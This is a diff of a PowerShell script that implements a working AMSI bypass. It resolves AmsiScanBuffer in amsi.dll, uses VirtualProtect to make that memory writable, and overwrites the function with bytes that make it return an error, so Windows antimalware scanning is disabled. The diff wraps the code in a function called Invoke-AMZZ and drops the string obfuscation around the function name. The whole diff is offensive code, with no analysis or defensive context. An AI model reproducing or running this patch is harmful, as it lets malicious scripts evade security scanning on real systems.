@@ -17,15 +17,15 @@ function get_proc_address {
 
 
 
-$ppruhu = get_proc_address amsi.dll "A@m@s@i@Sc@an@Bu@f@fer".Replace("@","")
-
-$ppruhu
-$virpro = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll VirtualProtect),(get_delegate_type (@([System.IntPtr], [System.UIntPtr], [System.UInt32], [System.UInt32].MakeByRefType())) ([System.Boolean])));$p = 0
-$virpro.Invoke($ppruhu, [UInt32]5, 0x40, [ref]$p)
+function Invoke-AMZZ {
+    $ppruhu = get_proc_address amsi.dll AmsiScanBuffer
+    $virpro = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll VirtualProtect),(get_delegate_type (@([System.IntPtr], [System.UIntPtr], [System.UInt32], [System.UInt32].MakeByRefType())) ([System.Boolean])));$p = 0
+    $virpro.Invoke($ppruhu, [UInt32]5, 0x40, [ref]$p)
     
-$scnfh = @([Byte] 0xB8, [Byte] 0x57, [Byte] 0x00,[Byte] 0x07, [Byte] 0x80, [Byte] 0xC3)
-[System.Runtime.InteropServices.Marshal]::Copy($scnfh, 0, $ppruhu, 6)
+    $scnfh = @([Byte] 0xB8, [Byte] 0x57, [Byte] 0x00,[Byte] 0x07, [Byte] 0x80, [Byte] 0xC3)
+    [System.Runtime.InteropServices.Marshal]::Copy($scnfh, 0, $ppruhu, 6)
 
+}
 
 
 
